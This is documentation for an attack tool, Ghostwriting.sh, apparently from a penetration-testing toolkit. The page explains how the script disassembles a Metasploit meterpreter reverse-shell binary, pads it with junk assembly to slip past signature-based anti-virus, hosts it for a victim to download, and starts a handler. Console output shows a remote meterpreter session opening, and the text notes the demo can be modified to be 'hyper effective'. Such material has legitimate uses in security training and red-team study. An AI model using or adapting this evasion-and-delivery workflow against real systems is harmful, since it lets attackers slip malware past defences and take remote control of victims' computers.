# Ghostwriting.sh - Anti-virus Filter Bypass
[Documentation](https://adhdproject.github.io/#!Tools/Attack/Ghostwriting.md)
One common technique employed by anti-virus software is to catalog signatures of known malicious code, which can then be used to flag files containing content that produces a matching signature. Ghostwriting is a method to bypass this kind of check by deconstructing a binary, inserting arbitrary and benign assembly, and reconstructing it, thus changing its signature without changing its functionality. Ghostwriting.sh is a script used to automate this process using Metasploit tools. 

### Usage
Although the Metasploit tools used by Ghostwriting.sh are general purpose and this technique can be applied to any binary, the Ghostwriting.sh script itself has many important values hardcoded in, including the target binary. It is intended to be significantly modified before use, or used as a reference (noted in the original documentation: "this script is a demonstration tool ... it can however be modified to be hyper effective")

The following is a usage synopsis of the default behavior, which as noted is exclusively a demo.

1. Ghostwriting.sh can be started simply by invoking it with no arguments. It will automatically load a meterpreter reverse tcp binary ready to connect to the machine running the Ghostwriting.sh script, disassemble it, insert extraneous code, and reassemble it. It will then start a web server hosting the newly obfuscated executable.
```
$ sudo ./ghostwriting.sh
    **************************************************** 
    Opening webserver on 192.168.27.171:8000 for file transfer 
    Ctrl+C to continue after file transfer 
    **************************************************** 
    Serving HTTP on 0.0.0.0 port 8000 ...
```

2. On the victim machine, the user can navigate to the address hosting the new executable, and download and run EveryVillainIsLemons.exe. At this point, depending on anti-virus software being run, it may block the download, block execution, or (hopefully) do nothing at all and let the malicious code slide. 

![directory listing for /](https://adhdproject.github.io/Tools/Attack/Ghostwriting.sh_files/downloads.PNG)

The meterpreter reverse tcp shell binary is a common and well published binary file. Any half-baked anti-virus will recognize the signature of an unmodified copy of meterpreter. If EveryVillainIsLemons.exe passes anti-virus checks, the technique has been a success. 

3. Back in the Ghostwriting.sh prompt, the user can now enter Ctrl + C to continue, and will be prompted to begin the meterpreter handler.
```
File Transfer Complete, probably... 
Would you like to start the handler now? [y/N] 
y 
Starting Handler LHOST => 192.168.27.171 LPORT => 8080 
[*] Started reverse handler on 192.168.27.171:8080 
[*] Starting the payload handler...
```

Once the obfuscated executable makes connection, a remote shell will be started.
```
[*] Sending state (769536 bytes) to 192.168.27.1 
[*] Meterpreter session 1 opened (192.168.27.171:8080 -> 192.168.27.1:9832) at 2014-06-30 12:41:33 
meterpreter \>
```
Everything has worked, and the demo is over.
